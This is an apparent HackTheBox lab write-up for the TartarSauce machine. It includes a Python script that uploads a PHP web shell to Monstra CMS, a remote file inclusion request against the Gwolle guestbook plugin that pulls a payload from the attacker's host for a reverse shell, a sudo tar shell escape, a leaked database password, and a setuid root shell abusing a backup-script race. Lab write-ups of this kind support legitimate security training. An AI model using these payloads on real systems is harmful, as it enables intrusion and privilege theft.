
### Initial access
Nmap
```bash
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
| http-robots.txt: 5 disallowed entries 
| /webservices/tar/tar/source/ 
| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/ 
|_/webservices/developmental/ /webservices/phpmyadmin/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Landing Page


```

Using this exploit https://www.exploit-db.com/exploits/52038
We use defaukt cred `admin:admin`
We modify the code
```bash
import requests
import random
import string
import time
import re
import sys

if len(sys.argv) < 4:
    print("Usage: python3 script.py <url> <username> <password>")
    sys.exit(1)

base_url = sys.argv[1].rstrip('/')
username = sys.argv[2]
password = sys.argv[3]

session = requests.Session()

# Login
login_url = f'{base_url}/admin/index.php?id=dashboard'
login_data = {
    'login': username,
    'password': password,
    'login_submit': 'Log+In'
}

print("[*] Logging in...")
response = session.post(login_url, data=login_data)

if 'Dashboard' not in response.text:
    print("[!] Login failed")
    sys.exit(1)
print("[+] Login successful")

time.sleep(2)

# Get CSRF token from theme editor page
edit_url = f'{base_url}/admin/index.php?id=themes&action=add_chunk'
response = session.get(edit_url)

token_match = re.search(r'input type="hidden" id="csrf" name="csrf" value="([^"]+)"', response.text)
if not token_match:
    print("[!] CSRF token not found")
    sys.exit(1)
token = token_match.group(1)
print(f"[*] CSRF token: {token[:20]}...")

# Generate random filename
filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

# Webshell payload – executes GET['cmd']
content = '''<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
if(isset($_GET['cmd']))
{
    system($_GET['cmd']);
}
?>
</pre>
</body>
</html>'''

edit_data = {
    'csrf': token,
    'name': filename,
    'content': content,
    'add_file': 'Save'
}

print("[*] Uploading shell...")
response = session.post(edit_url, data=edit_data)
time.sleep(2)

# Check if file was created
shell_url = f'{base_url}/public/themes/default/{filename}.chunk.php'
shell_check = session.get(shell_url)
if shell_check.status_code == 200 and 'Execute' in shell_check.text:
    print(f"[+] Shell uploaded: {shell_url}")
else:
    print("[!] Shell upload failed – check permissions or CMS version")
    sys.exit(1)

# Test shell
test = session.get(shell_url, params={'cmd': 'whoami'})
print(f"[*] Test output: {test.text.strip()}")
```
 But it seem like rabbit hole  continue recon
 ```bash
 200      GET      563l      128w    10766c http://tartarsauce.htb/
200      GET      563l      128w    10766c http://tartarsauce.htb/index.html
301      GET        9l       28w      327c http://tartarsauce.htb/webservices/wp => http://tartarsauce.htb/webservices/wp/
200      GET        7l       12w      208c http://tartarsauce.htb/robots.txt
301      GET        9l       28w      324c http://tartarsauce.htb/webservices => http://tartarsauce.htb/webservices/
301      GET        0l        0w        0c http://tartarsauce.htb/webservices/wp/index.php => http://tartarsauce.htb/webservices/wp/
301      GET        9l       28w      338c http://tartarsauce.htb/webservices/wp/wp-content => http://tartarsauce.htb/webservices/wp/wp-content/
200      GET        0l        0w        0c http://tartarsauce.htb/webservices/wp/wp-content/index.php
200      GET       63l      173w     2338c http://tartarsauce.htb/webservices/wp/wp-login.php
200      GET      385l     3179w    19935c http://tartarsauce.htb/webservices/wp/license.txt
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-content/uploads => http://tartarsauce.htb/webservices/wp/wp-content/uploads/
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-content/plugins => http://tartarsauce.htb/webservices/wp/wp-content/plugins/
301      GET        9l       28w      345c http://tartarsauce.htb/webservices/wp/wp-content/themes => http://tartarsauce.htb/webservices/wp/wp-content/themes/
301      GET        9l       28w      339c http://tartarsauce.htb/webservices/wp/wp-includes => http://tartarsauce.htb/webservices/wp/wp-includes/
301      GET        9l       28w      346c http://tartarsauce.htb/webservices/wp/wp-content/upgrade => http://tartarsauce.htb/webservices/wp/wp-content/upgrade/
200      GET      451l      868w     7020c http://tartarsauce.htb/webservices/wp/wp-admin/css/install.css

 ```
We wpscan
```
[+] gwolle-gb | Location: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/ | Last Updated: 2026-08-21 6:47am GMT (18 days ago, per WordPress.org) | Active Installs: 20,000 (per WordPress.org) | Readme: http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt | [!] The version is out of date, the latest version is 5.1.0 | | Found By: Known Locations (Aggressive Detection) | - http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/, status: 200 | | [!] 4 vulnerabilities identified: | | [!] Title: Gwolle Guestbook <= 2.5.3 - Cross-Site Scripting (XSS) | UUID: 00c33bf2-1527-4276-a470-a21da5929566 | Fixed in: 2.5.4 | References: | - https://wpscan.com/vulnerability/00c33bf2-1527-4276-a470-a21da5929566 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17884 | - https://seclists.org/fulldisclosure/2018/Jul/89 | - https://www.defensecode.com/advisories/DC-2018-05-008_WordPress_Gwolle_Guestbook_Plugin_Advisory.pdf | - https://plugins.trac.wordpress.org/changeset/1888023/gwolle-gb | | [!] Title: Gwolle Guestbook < 4.2.0 - Reflected Cross-Site Scripting | UUID: e50bcb39-9a01-433f-81b3-fd4018672b85 | Fixed in: 4.2.0 | References: | - https://wpscan.com/vulnerability/e50bcb39-9a01-433f-81b3-fd4018672b85 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24980 | | [!] Title: Gwolle Guestbook < 4.7.2 - Reflected Cross-Site Scripting | UUID: 8794d753-2198-4aa9-b465-15299919f48a | Fixed in: 4.7.2 | References: | - https://wpscan.com/vulnerability/8794d753-2198-4aa9-b465-15299919f48a | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-24710 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/c4048480-25a8-449f-8edb-a2a8854425ff | | [!] Title: Gwolle Guestbook < 4.9.3 - Unauthenticated Stored Cross-Site Scripting via `gwolle_gb_content` Parameter | UUID: ba39d490-5c88-4e2b-b65b-97717c0adcc0 | Fixed in: 4.9.3 | References: | - https://wpscan.com/vulnerability/ba39d490-5c88-4e2b-b65b-97717c0adcc0 | - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-5807 | - https://www.wordfence.com/threat-intel/vulnerabilities/id/956f86c5-05af-41c3-a779-5b25f62122dd |
```
But we dont find any rce vector seraching in the web we see the exploit coud lead us to rce
https://www.exploit-db.com/exploits/38861
```bash
curl http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.17.47/

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/oscp/exploit-tool]
└─$ python3 -m  http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.1.185 - - [09/Sep/2026 02:23:49] "GET /wp-load.php HTTP/1.0" 200 -

┌──(kali㉿kali)-[~/HTB/TartarSauce]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.17.47] from (UNKNOWN) [10.129.1.185] 35628
Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 athlon i686 GNU/Linux
 02:23:01 up  2:50,  0 users,  load average: 0.10, 0.04, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1403): Inappropriate ioctl for device
bash: no job control in this shell
www-data@TartarSauce:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@TartarSauce:/$ 




```
We get revshell uding pentestmonkey php


### Lateral Movement

```
www-data@TartarSauce:/$ sudo -l
sudo -l
Matching Defaults entries for www-data on TartarSauce:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar

```

Run linpeas
```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 root root 2963 Jan 21  2021 /var/www/html/webservices/wp/wp-config.php                                                                                                          
define('DB_NAME', 'wp');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', 'w0rdpr3$$d@t@b@$3@cc3$$');
define('DB_HOST', 'localhost');

mysql> sselect * from wp_users
select * from wp_users
    -> ;
;
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email         | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | wpadmin    | $P$BBU0yjydBz9THONExe2kPEsvtjStGe1 | wpadmin       | wpadmin@test.local |          | 2018-02-09 20:49:26 |                     |           0 | wpadmin      |
+----+------------+------------------------------------+---------------+--------------------+----------+---------------------+---------------------+-------------+--------------+
1 row in set (0.00 sec)

mysql> 


```

Crack hash (rabbithole)
Read again what we find we see the sudo- l command run with onuma user so we can lateral movement
```
User www-data may run the following commands on TartarSauce:
    (onuma) NOPASSWD: /bin/tar
```

```bash
www-data@TartarSauce:/home$ sudo -u onuma tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
t=1 --checkpoint-action=exec=/bin/shnull --checkpoin 
tar: Removing leading `/' from member names
$ id
id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
$ bash
bash
onuma@TartarSauce:/home$ 



```

### Priv escalation
After run linpeas we see the file and found that this could be some hidden task me dont see
```
╔══════════╣ Modified interesting files in the last 5mins (limit 100) (T1083)
/var/log/kern.log
/var/log/syslog
/var/log/auth.log
/var/backups/onuma_backup_test.txt
/var/backups/onuma-www-dev.bak
/home/onuma/.config/lxc/client.key
/home/onuma/.config/lxc/client.crt
/home/onuma/.gnupg/pubring.gpg
/home/onuma/.gnupg/secring.gpg
/home/onuma/.gnupg/gpg.conf
/home/onuma/.gnupg/trustdb.gpg



onuma@TartarSauce:~$ cat /var/backups/onumcat /var/backups/onuma_backup_test.txt

cat /var/backups/onuma_backup_test.txt
------------------------------------------------------------------------
Auto backup backuperer backup last ran at : Wed Sep  9 03:03:53 EDT 2026
------------------------------------------------------------------------

```

Run pspy32 base on the os 
```bash
2026/09/09 03:26:00 CMD: UID=0    PID=112    | 
2026/09/09 03:26:00 CMD: UID=0    PID=11     | 
2026/09/09 03:26:00 CMD: UID=0    PID=1092   | /sbin/mdadm --monitor --pid-file /run/mdadm/monitor.pid --daemonise --scan --syslog 
2026/09/09 03:26:00 CMD: UID=0    PID=1038   | /usr/lib/policykit-1/polkitd --no-debug 
2026/09/09 03:26:00 CMD: UID=0    PID=1029   | /usr/sbin/cron -f 
2026/09/09 03:26:00 CMD: UID=0    PID=10     | 
2026/09/09 03:26:00 CMD: UID=0    PID=1      | /sbin/init 
2026/09/09 03:30:27 CMD: UID=0    PID=6308   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6307   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6306   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6305   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6304   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6300   | 
2026/09/09 03:30:27 CMD: UID=0    PID=6299   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6298   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6297   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6296   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6295   | /lib/systemd/systemd-udevd 
2026/09/09 03:30:27 CMD: UID=0    PID=6294   | /bin/bash /usr/sbin/backuperer 
2026/09/09 03:30:27 CMD: UID=0    PID=6318   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6309   | /bin/bash /usr/sbin/backuperer 
2026/09/09 03:30:27 CMD: UID=0    PID=6322   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6326   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6328   | 
2026/09/09 03:30:27 CMD: UID=0    PID=6333   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6339   | 
2026/09/09 03:30:27 CMD: UID=0    PID=6347   | /bin/bash /usr/sbin/backuperer 
2026/09/09 03:30:27 CMD: UID=0    PID=6353   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6357   | 
2026/09/09 03:30:27 CMD: UID=0    PID=6359   | 
2026/09/09 03:30:27 CMD: UID=0    PID=6363   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6367   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6369   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6372   | /bin/bash /usr/sbin/backuperer 
2026/09/09 03:30:27 CMD: UID=0    PID=6376   | /bin/bash /usr/sbin/backuperer 
2026/09/09 03:30:27 CMD: UID=0    PID=6377   | 
2026/09/09 03:30:27 CMD: UID=0    PID=6381   | /usr/bin/printf - 
2026/09/09 03:30:27 CMD: UID=0    PID=6386   | /bin/bash /usr/sbin/backuperer 
2026/09/09 03:30:27 CMD: UID=0    PID=6390   | /bin/sleep 30 
2026/09/09 03:30:27 CMD: UID=0    PID=6389   | /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.4aba9bd0cff24b7ecfaa85c1968112154d0688e8 /var/www/html 
2026/09/09 03:30:27 CMD: UID=1000 PID=6393   | /bin/tar -zcvf /var/tmp/.4aba9bd0cff24b7ecfaa85c1968112154d0688e8 /var/www/html 
2026/09/09 03:30:27 CMD: UID=1000 PID=6394   | gzip 

```

We see process running /usr/sbin/backuperer  weird binary

```
onuma@TartarSauce:~$ cat /usr/sbin/backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
onuma@TartarSauce:~$ ls -la /usr/sbin/backuperer
-rwxr-xr-x 1 root root 1701 Feb 21  2018 /usr/sbin/backuperer

```

We see that is a bash script let find a way to exploit it

So the thing here is race condition in sleep 30 allow us to modify file tar in $tmp folder , which we have all priv to modify. After reseach we can keep suid program even it not form our machine from tar. So we need to compile suid with root in our kali to send to the machine.

Script to exploit
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main( int argc, char *argv[] )
{
        setreuid(0, 0);
        execve("/bin/sh", NULL, NULL);
}   
```

```
┌──(root㉿kali)-[/home/…/exploit-tool/var/www/html]
└─# gcc -m32 suidshell.c -o suid
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/exploit-tool/var/www/html]
└─# chmod 4755 suid
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/exploit-tool/var/www/html]
└─# ls -la suid
-rwsr-xr-x 1 root root 15028 Sep  9 07:03 suid
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/…/exploit-tool/var/www/html]
└─# cd ../../../   
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/oscp/exploit-tool]
└─# tar -zvcf exp.tar.gz var 
var/
var/www/
var/www/html/
var/www/html/suidshell.c
var/www/html/suid
                   
```


Check timer of cronjobs
```
watch -n 1 'systemctl list-timers'
```